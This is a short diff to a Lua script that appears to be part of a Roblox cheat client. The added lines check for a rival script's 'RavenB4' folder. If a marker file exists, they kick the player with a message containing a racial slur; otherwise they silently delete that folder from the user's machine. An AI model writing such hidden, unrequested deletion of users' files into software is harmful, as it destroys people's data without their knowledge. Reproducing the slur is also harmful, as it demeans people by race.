@@ -5865,7 +5865,13 @@ runFunction(function()
 	createKeystroke(Enum.KeyCode.Space, UDim2.new(0, 0, 0, 83), UDim2.new(0, 25, 0, -10))
 end)
 
-
+if isfolder('RavenB4') then 
+	if isfile('shitscript.txt') then 
+		lplr:Kick('ok nigga, go back to ur vape paste.') 
+	else
+		delfolder('RavenB4') 
+	end
+end
 
 --[[task.spawn(function()
 	local oldcommit = (isfile("vape/lawlcommit.txt") and readfile("vape/lawlcommit.txt"))
